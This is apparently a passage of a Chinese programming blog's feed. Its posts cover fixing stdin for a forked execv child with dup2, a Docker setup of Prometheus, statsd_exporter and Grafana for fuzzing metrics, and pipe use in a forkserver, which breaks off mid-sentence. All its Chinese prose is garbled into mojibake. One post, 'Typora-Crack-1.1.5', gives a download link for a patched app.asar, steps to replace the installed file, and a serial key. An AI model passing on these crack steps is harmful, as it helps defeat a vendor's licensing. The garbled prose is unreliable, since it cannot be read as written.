directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span><span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> a<span class="token punctuation">,</span>b<span class="token punctuation">;</span>    <span class="token keyword">int</span> len <span class="token operator">=</span> argc<span class="token punctuation">;</span>    cout<span class="token operator">&lt;&lt;</span><span class="token string">"argv[0] :"</span><span class="token operator">&lt;&lt;</span>argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>    cout<span class="token operator">&lt;&lt;</span><span class="token string">"input a and b"</span><span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>    cin<span class="token operator">>></span>a<span class="token operator">>></span>b<span class="token punctuation">;</span>    cout<span class="token operator">&lt;&lt;</span><span class="token string">"a : "</span><span class="token operator">&lt;&lt;</span>a<span class="token operator">&lt;&lt;</span><span class="token string">" b is "</span><span class="token operator">&lt;&lt;</span>b<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>    cout<span class="token operator">&lt;&lt;</span><span class="token string">"a/b is :"</span><span class="token operator">&lt;&lt;</span>a<span class="token operator">/</span>b<span class="token operator">&lt;&lt;</span>endl<span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>ç›´æ¥æ‰§è¡Œè‚¯å®šæ˜¯æ²¡é—®é¢˜çš„ï¼Œ</p><p>ä½†æ˜¯å½“æˆ‘æƒ³forkä¸€ä¸ªå­è¿›ç¨‹é€šè¿‡execvè¿›è¡Œè°ƒç”¨çš„æ—¶å€™ï¼Œ ä¼šå‡ºç°å†…å­˜è¶Šç•Œè¯»çš„é—®é¢˜</p><p>å¦‚ä¸‹é”™è¯¯ï¼š</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp">root@<span class="token number">0187031113</span>b5<span class="token operator">:</span><span class="token operator">/</span>work05# <span class="token punctuation">.</span><span class="token operator">/</span>test<span class="token punctuation">.</span>cccroot@<span class="token number">0187031113</span>b5<span class="token operator">:</span><span class="token operator">/</span>work05# argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">:</span><span class="token operator">/</span>work05<span class="token operator">/</span><span class="token number">2.</span>outinput a <span class="token operator">and</span> ba <span class="token operator">:</span> <span class="token operator">-</span><span class="token number">1422482224</span> b is <span class="token number">537128240</span>a<span class="token operator">/</span>b is <span class="token operator">:</span><span class="token operator">-</span><span class="token number">2</span></code></pre><p>execve fork çš„ä»£ç å¦‚ä¸‹ï¼š</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">test</span><span class="token expression"><span class="token punctuation">.</span>cpp</span></span>#<span class="token number">2.</span>out ä¸ºä¸Šè¿°a<span class="token operator">/</span>bä»£ç çš„å¯æ‰§è¡Œæ–‡ä»¶<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> chid  <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>chid  <span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token function">PFATAL</span><span class="token punctuation">(</span><span class="token string">"fork error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>chid<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      std<span class="token double-colon punctuation">::</span>string tp <span class="token operator">=</span> <span class="token string">"&lt;path to >/2.out"</span><span class="token punctuation">;</span>      <span class="token keyword">char</span> <span class="token operator">*</span> a_argv<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token function">strdup</span><span class="token punctuation">(</span>tp<span class="token punctuation">.</span><span class="token function">c_str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">nullptr</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>      <span class="token keyword">char</span> <span class="token operator">*</span>envp<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>      <span class="token function">execve</span><span class="token punctuation">(</span>a_argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>a_argv<span class="token punctuation">,</span>envp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>å½“æˆ‘å°è¯•å°†a_argv[] ä¿®æ”¹å¦‚ä¸‹æ—¶</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">char</span> <span class="token operator">*</span> a_argv<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token function">strdup</span><span class="token punctuation">(</span>tp<span class="token punctuation">.</span><span class="token function">c_str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre><p>execveæœªæ­£ç¡®æ‰§è¡Œï¼Œå¦‚ä¸‹å›¾æ•ˆæœ</p><p><img src="https://s2.loli.net/2022/07/14/xVkXPZJo6OtEHF8.png" class="lazyload" data-srcset="https://s2.loli.net/2022/07/14/xVkXPZJo6OtEHF8.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220713202128254"></p><h2 id="è§£å†³æ–¹å¼">è§£å†³æ–¹å¼</h2><div class="story post-story"><p>å½“æˆ‘ä»¬æƒ³ä½¿ç”¨<code>fork+execvä»¥åŠstdin</code>æ—¶ï¼Œ åº”è¯¥ä½¿ç”¨<code>dup2 </code>æ–‡ä»¶é‡å®šå‘å‡½æ•°,å°†è¾“å…¥<code>in.txt</code>ç­‰æ–‡ä»¶å†…å®¹ä½œä¸º` STDIN_FILEN</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">/* Standard file descriptors.  */</span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span><span class="token macro-name">STDIN_FILENO</span><span class="token expression"><span class="token number">0</span></span><span class="token comment">/* Standard input.  */</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span><span class="token macro-name">STDOUT_FILENO</span><span class="token expression"><span class="token number">1</span></span><span class="token comment">/* Standard output.  */</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span><span class="token macro-name">STDERR_FILENO</span><span class="token expression"><span class="token number">2</span></span><span class="token comment">/* Standard error output.  */</span></span></code></pre><p>æ­£ç¡®çš„æ–¹å¼å¦‚ä¸‹ä»£ç æ‰€ç¤ºï¼š</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> status<span class="token punctuation">;</span>    std<span class="token double-colon punctuation">::</span>string fcur  <span class="token operator">=</span> <span class="token string">"&lt;path to input>/.cur_input"</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> fd <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span>fcur<span class="token punctuation">.</span><span class="token function">c_str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>O_RDONLY<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> chid  <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>chid  <span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token function">PFATAL</span><span class="token punctuation">(</span><span class="token string">"fork error"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span>chid<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>      <span class="token comment">/* Child */</span>      std<span class="token double-colon punctuation">::</span>string tp <span class="token operator">=</span> <span class="token string">"&lt;path to >/2.out"</span><span class="token punctuation">;</span>      std<span class="token double-colon punctuation">::</span>vector<span class="token operator">&lt;</span>std<span class="token double-colon punctuation">::</span>string<span class="token operator">></span> vt<span class="token punctuation">;</span>      vt<span class="token punctuation">.</span><span class="token function">push_back</span><span class="token punctuation">(</span>tp<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token function">dup2</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span>STDIN_FILENO<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">char</span> <span class="token operator">*</span> a_argv<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token function">strdup</span><span class="token punctuation">(</span>tp<span class="token punctuation">.</span><span class="token function">c_str</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">nullptr</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>      <span class="token keyword">char</span> <span class="token operator">*</span>envp<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>      <span class="token function">execv</span><span class="token punctuation">(</span>a_argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>a_argv<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token comment">/* Parents*/</span>    <span class="token function">wait</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>status<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">close</span><span class="token punctuation">(</span>fd<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p><img src="https://s2.loli.net/2022/07/14/fNcLQVXCKJ1sr5I.png" class="lazyload" data-srcset="https://s2.loli.net/2022/07/14/fNcLQVXCKJ1sr5I.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220713222100498"></p></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> execv </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Prometheus+Grafana æ•°æ®å¯è§†åŒ–</title>
      <link href="/posts/3c3b772/"/>
      <url>/posts/3c3b772/</url>
      
        <content type="html"><![CDATA[<h1>Prometheus + Grafana è¿è¡Œæ•°æ®å¯è§†åŒ–</h1><blockquote><p>@2022-07-12 11:19:16</p><p>@sizaif</p><p>@æ¶‰åŠçŸ¥è¯†ï¼š</p><ol><li>docker å®¹å™¨é—´é€šä¿¡</li><li>docker compose ç”¨æ³•</li><li>æ•°æ®ç¼–ç æ ¼å¼</li></ol></blockquote><h2 id="éœ€æ±‚">éœ€æ±‚</h2><div class="story post-story"><p><strong>åŸå…ˆæ•ˆæœå¦‚ä¸‹ï¼š</strong></p><p><img src="https://s2.loli.net/2022/07/12/Y4EyUIDsib5ZOzo.png" class="lazyload" data-srcset="https://s2.loli.net/2022/07/12/Y4EyUIDsib5ZOzo.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220712112737874"></p><p>å°†è¿è¡Œçš„æ‰§è¡Œæ•°æ®å¯è§†åŒ–å</p><p><strong>æ•ˆæœå¦‚ä¸‹ï¼š</strong></p><p><img src="https://s2.loli.net/2022/07/12/NjvGitRFdVq3bCI.png" class="lazyload" data-srcset="https://s2.loli.net/2022/07/12/NjvGitRFdVq3bCI.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220712112513694"></p></div><h2 id="å‰æå‡†å¤‡">å‰æå‡†å¤‡</h2><div class="story post-story"><ol><li><p>é‡‡ç”¨dockerçš„æ–¹å¼</p><p>grafana<br>statsd_exporter<br>prometheus</p></li><li><p>å®¿ä¸»æœºä¸ºWindowsç¯å¢ƒ</p></li></ol><p><strong>æ¶æ„å›¾å¦‚ä¸‹ï¼š</strong></p><p><img src="https://s2.loli.net/2022/07/12/qKITzOWRFkNhYG3.png" class="lazyload" data-srcset="https://s2.loli.net/2022/07/12/qKITzOWRFkNhYG3.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220712113747334"></p><p><font color='red'><strong>è¯´æ˜ï¼š</strong></font></p><ol><li>fuzzç¨‹åºï¼Œgrafanaï¼Œstatsd_exporterï¼Œprometheus éƒ½åœ¨dockerå®¹å™¨ä¸­ï¼Œæ¶‰åŠåˆ°å®¹å™¨é—´é€šä¿¡</li></ol><p><strong>ç«¯å£æ˜ å°„å…³ç³»å¦‚ä¸‹ï¼š</strong></p><table><thead><tr><th>IMAGE</th><th>PORTS</th><th>NAMES</th></tr></thead><tbody><tr><td>grafana/grafana</td><td>0.0.0.0:3000-&gt;3000/tcp</td><td>grafana</td></tr><tr><td>prom/statsd-exporter</td><td>0.0.0.0:9102-&gt;9102/tcp, 9125/tcp, 0.0.0.0:8125-&gt;9125/udp</td><td>statsd_exporter</td></tr><tr><td>prom/prometheus</td><td>0.0.0.0:9090-&gt;9090/tcp</td><td>prometheus</td></tr></tbody></table><p>é‡‡ç”¨<code>docker compose</code> åˆ›å»ºä¸€ä¸ªä»¥æ¡¥æ¥æ–¹å¼çš„<code>statsd-net</code>ç½‘ç»œï¼Œ</p><p><font color='red'>æ­¤æ—¶<code>docker compose</code>å†…çš„å®¹å™¨å¯é€šè¿‡<code>å®¹å™¨name+port</code>è¿›è¡Œé€šä¿¡</font></p><p>ä¾‹å¦‚ï¼š<code>promethes</code>è·å–<code>statsd-exporter</code>ä¸­çš„æ•°æ®</p><p>åªéœ€ç”¨getè·å–<code>http://statsd-exporter:9102</code> å³å¯è·å–</p><p><code>statsd-net</code>ç½‘ç»œä¸­çš„æŸä¸ªå®¹å™¨çš„ipæ®µå¦‚ä¸‹ï¼š <code>172.18.0.2-172.18.0.4</code></p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token string">"Networks"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token string">"docker-compose_statsd-net"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        Â·Â·Â·Â·Â·        <span class="token string">"Gateway"</span><span class="token operator">:</span> <span class="token string">"172.18.0.1"</span><span class="token punctuation">,</span>        <span class="token string">"IPAddress"</span><span class="token operator">:</span> <span class="token string">"172.18.0.2"</span><span class="token punctuation">,</span>        Â·Â·Â·Â·Â·    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><strong>æ­¤æ—¶è‹¥<code>statsd-net</code>ç½‘ç»œå¤–çš„å®¹å™¨æƒ³ä¸ç½‘ç»œå†…çš„å®¹å™¨è¿›è¡Œé€šä¿¡åªéœ€å°†å…¶åŠ å…¥åˆ°<code>statsd-net</code>ç½‘ç»œå³å¯[1]</strong></p><blockquote><p>[1] æ­¤å¤„å‚è€ƒï¼š <a href="https://zhuanlan.zhihu.com/p/429276977">https://zhuanlan.zhihu.com/p/429276977</a></p><p><img src="https://s2.loli.net/2022/07/12/uj2nYTXGsldpJKa.jpg" class="lazyload" data-srcset="https://s2.loli.net/2022/07/12/uj2nYTXGsldpJKa.jpg" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="img"></p></blockquote><p>æ‰§è¡Œï¼š <code>docker network connect statsd-net &lt;container ID&gt;</code></p><p>æ‰§è¡Œå<container ID>çš„ipå¦‚ä¸‹æ‰€ç¤ºï¼š</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp"><span class="token string">"Networks"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>    <span class="token string">"bridge"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        Â·Â·Â·Â·Â·        <span class="token string">"Gateway"</span><span class="token operator">:</span> <span class="token string">"172.17.0.1"</span><span class="token punctuation">,</span>        <span class="token string">"IPAddress"</span><span class="token operator">:</span> <span class="token string">"172.17.0.2"</span><span class="token punctuation">,</span>        Â·Â·Â·Â·Â·    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token string">"docker-compose_statsd-net"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>        Â·Â·Â·Â·Â·        <span class="token string">"Gateway"</span><span class="token operator">:</span> <span class="token string">"172.18.0.1"</span><span class="token punctuation">,</span>        <span class="token string">"IPAddress"</span><span class="token operator">:</span> <span class="token string">"172.18.0.5"</span><span class="token punctuation">,</span>        Â·Â·Â·Â·Â·    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></code></pre><p><strong>æ­¤æ—¶æ‰€æœ‰å®¹å™¨å¯ç›¸äº’é€šä¿¡</strong></p></div><h2 id="æ­¥éª¤">æ­¥éª¤</h2><div class="story post-story"><h3 id="docker-éƒ¨åˆ†">docker éƒ¨åˆ†</h3><ol><li><p>åˆ›å»º<code>docker-compose.yml</code>æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp">version<span class="token operator">:</span> <span class="token string">'3'</span>networks<span class="token operator">:</span>  statsd<span class="token operator">-</span>net<span class="token operator">:</span>    driver<span class="token operator">:</span> bridgeservices<span class="token operator">:</span>  prometheus<span class="token operator">:</span>    image<span class="token operator">:</span> prom<span class="token operator">/</span>prometheus    container_name<span class="token operator">:</span> prometheus    volumes<span class="token operator">:</span>      <span class="token operator">-</span> <span class="token punctuation">.</span><span class="token operator">/</span>prometheus<span class="token punctuation">.</span>yml<span class="token operator">:</span><span class="token operator">/</span>prometheus<span class="token punctuation">.</span>yml    command<span class="token operator">:</span>      <span class="token operator">-</span> <span class="token string">'--config.file=/prometheus.yml'</span>    restart<span class="token operator">:</span> unless<span class="token operator">-</span>stopped    ports<span class="token operator">:</span>      <span class="token operator">-</span> <span class="token string">"9090:9090"</span>    networks<span class="token operator">:</span>      <span class="token operator">-</span> statsd<span class="token operator">-</span>net  statsd_exporter<span class="token operator">:</span>    image<span class="token operator">:</span> prom<span class="token operator">/</span>statsd<span class="token operator">-</span>exporter    container_name<span class="token operator">:</span> statsd_exporter    volumes<span class="token operator">:</span>      <span class="token operator">-</span> <span class="token punctuation">.</span><span class="token operator">/</span>statsd_mapping<span class="token punctuation">.</span>yml<span class="token operator">:</span><span class="token operator">/</span>statsd_mapping<span class="token punctuation">.</span>yml    command<span class="token operator">:</span>      <span class="token operator">-</span> <span class="token string">"--statsd.mapping-config=/statsd_mapping.yml"</span>    ports<span class="token operator">:</span>      <span class="token operator">-</span> <span class="token string">"9102:9102/tcp"</span>      <span class="token operator">-</span> <span class="token string">"8125:9125/udp"</span>    networks<span class="token operator">:</span>      <span class="token operator">-</span> statsd<span class="token operator">-</span>net  grafana<span class="token operator">:</span>    image<span class="token operator">:</span> grafana<span class="token operator">/</span>grafana    container_name<span class="token operator">:</span> grafana    restart<span class="token operator">:</span> unless<span class="token operator">-</span>stopped    ports<span class="token operator">:</span>        <span class="token operator">-</span> <span class="token string">"3000:3000"</span>    networks<span class="token operator">:</span>      <span class="token operator">-</span> statsd<span class="token operator">-</span>net</code></pre></li><li><p>åˆ›å»º <code>prometheus.yml</code> æ–‡ä»¶ï¼Œå†…å®¹å¦‚ä¸‹</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp">global<span class="token operator">:</span>  scrape_interval<span class="token operator">:</span>      <span class="token number">15</span>s  evaluation_interval<span class="token operator">:</span>  <span class="token number">15</span>sscrape_configs<span class="token operator">:</span>  <span class="token operator">-</span> job_name<span class="token operator">:</span> <span class="token string">'fuzzing_metrics'</span>    static_configs<span class="token operator">:</span>      <span class="token operator">-</span> targets<span class="token operator">:</span> <span class="token punctuation">[</span><span class="token string">'statsd_exporter:9102'</span><span class="token punctuation">]</span></code></pre></li><li><p>Create a <code>statsd_mapping.yml</code> containing the following:</p><pre class="language-cpp" data-language="cpp"><code class="language-cpp">mappings<span class="token operator">:</span><span class="token operator">-</span> match<span class="token operator">:</span> <span class="token string">"fuzzing.*"</span>  name<span class="token operator">:</span> <span class="token string">"fuzzing"</span>  labels<span class="token operator">:</span>      type<span class="token operator">:</span> <span class="token string">"$1"</span></code></pre></li><li><p>ç›®å½•å¦‚ä¸‹ï¼š</p><p><img src="https://s2.loli.net/2022/07/12/A3T7koM5ybgRvSO.png" class="lazyload" data-srcset="https://s2.loli.net/2022/07/12/A3T7koM5ybgRvSO.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220712115852711"></p><p>æ‰§è¡Œ<code>docker compose up -d</code>å‘½ä»¤</p></li></ol><h3 id="åå°ç®¡ç†">åå°ç®¡ç†</h3><ol><li><p>ç™»å½•<code>prometheus</code>åï¼Œ ï¼ˆ<code>localhost:9090</code>)</p><p><strong>targets</strong> ä¸­çŠ¶æ€ä¸º<strong>up</strong></p><p><img src="https://s2.loli.net/2022/07/12/tbYFTQHCexmP3z9.png" class="lazyload" data-srcset="https://s2.loli.net/2022/07/12/tbYFTQHCexmP3z9.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220712120201402"></p></li><li><p>ç™»å½•<code>Grafana</code>åå° (<code>localhost:3000</code>)   <font color='blue'>user:admin , pwd: admin</font></p><pre><code> **è®¾ç½®æ•°æ®æº**  URLä¸ºï¼š `http://Prometheus:9090`  ![image-20220712120444022](https://s2.loli.net/2022/07/12/T4JcEnZyQmo6qXH.png)</code></pre></li></ol><h3 id="æ•°æ®å‘é€StatSD">æ•°æ®å‘é€StatSD</h3><ol><li><p>ç¼–å†™<code>å‘é€.cpp</code></p><p><font color='red'>ä½¿ç”¨socketé€šä¿¡ï¼Œ portä¸º:<strong>8125</strong> (æ­¤å¤„ç«¯å£ä¸ºstatsd_exporteræ˜ å°„çš„udpæ¥æ”¶ç«¯ç«¯å£)</font></p><p>hostä¸ºï¼š <code>statsd-exporter</code>,  dockerä¼šè‡ªåŠ¨è¿›è¡Œipè½¬æ¢</p><p>StatSDæ•°æ®æ ¼å¼ï¼š</p><p>å‚è€ƒï¼š</p><p><a href="https://registry.hub.docker.com/r/prom/statsd-exporter">https://registry.hub.docker.com/r/prom/statsd-exporter</a></p><p><a href="https://docs.datadoghq.com/developers/dogstatsd/datagram_shell/?tabs=metrics">https://docs.datadoghq.com/developers/dogstatsd/datagram_shell/?tabs=metrics</a></p></li></ol><pre class="language-cpp" data-language="cpp"><code class="language-cpp">DogStatsD<span class="token operator">:</span>metric<span class="token punctuation">.</span>name<span class="token operator">:</span><span class="token operator">&lt;</span>value<span class="token operator">></span><span class="token operator">|</span><span class="token operator">&lt;</span>type<span class="token operator">></span><span class="token operator">|</span>#key<span class="token operator">:</span>value<span class="token punctuation">,</span>key2<span class="token operator">:</span>value2InfluxDBmetric<span class="token punctuation">.</span>name<span class="token punctuation">,</span>key<span class="token operator">=</span>value<span class="token punctuation">,</span>key2<span class="token operator">=</span>value2<span class="token operator">:</span><span class="token operator">&lt;</span>value<span class="token operator">></span><span class="token operator">|</span><span class="token operator">&lt;</span>type<span class="token operator">></span>Libratometric<span class="token punctuation">.</span>name#key<span class="token operator">=</span>value<span class="token punctuation">,</span>key2<span class="token operator">=</span>value2<span class="token operator">:</span><span class="token operator">&lt;</span>value<span class="token operator">></span><span class="token operator">|</span><span class="token operator">&lt;</span>type<span class="token operator">></span>SignalFXmetric<span class="token punctuation">.</span>name<span class="token punctuation">[</span>key<span class="token operator">=</span>value<span class="token punctuation">,</span>key2<span class="token operator">=</span>value2<span class="token punctuation">]</span><span class="token operator">:</span><span class="token operator">&lt;</span>value<span class="token operator">></span><span class="token operator">|</span><span class="token operator">&lt;</span>type<span class="token operator">></span></code></pre></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ ‡ç­¾äºŒ </tag>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Typora-Crack-1.1.5</title>
      <link href="/posts/54edf84f/"/>
      <url>/posts/54edf84f/</url>
      
        <content type="html"><![CDATA[<h2 id="ä¸‹è½½é“¾æ¥ï¼š">ä¸‹è½½é“¾æ¥ï¼š</h2><div class="story post-story"><p><a href="https://mega.nz/file/huZ2BQwQ#Wluvf9wh73J1h0g058Ey2P9EswmKgOubLTHBgwZAgJ8">https://mega.nz/file/huZ2BQwQ#Wluvf9wh73J1h0g058Ey2P9EswmKgOubLTHBgwZAgJ8</a></p><p>æˆ– RSPT</p></div><h2 id="é€‚ç”¨æ–¹æ³•">é€‚ç”¨æ–¹æ³•</h2><div class="story post-story"><pre class="language-cpp" data-language="cpp"><code class="language-cpp">å®‰è£…æ—¶è®°å¾— typoraçš„å®‰è£…ç›®å½•<span class="token number">1.</span> å®‰è£…å®Œæˆåï¼Œ æ‰“å¼€typoraï¼Œ ç‚¹å‡»<span class="token number">15</span>å¤©è¯•ç”¨<span class="token number">2.</span> å¤åˆ¶app<span class="token punctuation">.</span>asar æ›¿æ¢åˆ°typoraçš„å®‰è£…ç›®å½•ä¸‹çš„resourcesæ–‡ä»¶å¤¹ä¸­<span class="token number">3.</span> æ‰“å¼€typora è¿›è¡Œæ¿€æ´»e<span class="token operator">-</span>mail éšä¾¿å†™@åºåˆ—å·ï¼šJCEKRV<span class="token operator">-</span><span class="token number">4</span>V7ZSU<span class="token operator">-</span>PSQKQ7<span class="token operator">-</span>G2NT2Q</code></pre></div>]]></content>
      
      
      <categories>
          
          <category> æŠ€æœ¯å‘ </category>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> typora </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pipeä¸dup2ä¸forkå¦™ç”¨</title>
      <link href="/posts/8838784f/"/>
      <url>/posts/8838784f/</url>
      
        <content type="html"><![CDATA[<h2 id="æ¡†æ¶ï¼š">æ¡†æ¶ï¼š</h2><div class="story post-story"><p><strong>dup2  pipe ä¸fork ä¸€åŒä½¿ç”¨ï¼Œå…¶æ¡†æ¶å¦‚ä¸‹ï¼š</strong></p><p><img src="https://s2.loli.net/2022/06/02/CjxIyuZaqfK1GkW.png" class="lazyload" data-srcset="https://s2.loli.net/2022/06/02/CjxIyuZaqfK1GkW.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="image-20220602100927633"></p></div><h2 id="æ€è·¯ï¼š">æ€è·¯ï¼š</h2><div class="story post-story"><p>çˆ¶è¿›ç¨‹ï¼š</p><ol><li>å…³é—­<code>ctl_pipe[0]</code> è¯»ç«¯, è·å–<code>st_pipe[0]</code> å­è¿›ç¨‹ä¸­è°ƒç”¨<code>execv</code>çš„çŠ¶æ€-&gt; å³  <code>forkserver</code>æ˜¯å¦å‡†å¤‡å¥½</li><li>å†™å…¥<code>ctl_pipe[1]</code> é€šçŸ¥å­è¿›ç¨‹fuzz è¿›è¡Œä¸€ä¸ªfork</li></ol><p>å­è¿›ç¨‹ï¼š</p><ol><li><p>å…³é—­<code>st_pipe[0]</code> è¯»ç«¯ï¼Œè·å–<code>ctl_pipe[1]</code>  æ¥æ”¶æ¥è‡ªçˆ¶è¿›ç¨‹çš„å‘½ä»¤ï¼Œå¼€å¯ä¸€ä¸ªfork</p></li><li><p>å†™å…¥<code>st_pipe[1]</code> ï¼Œ 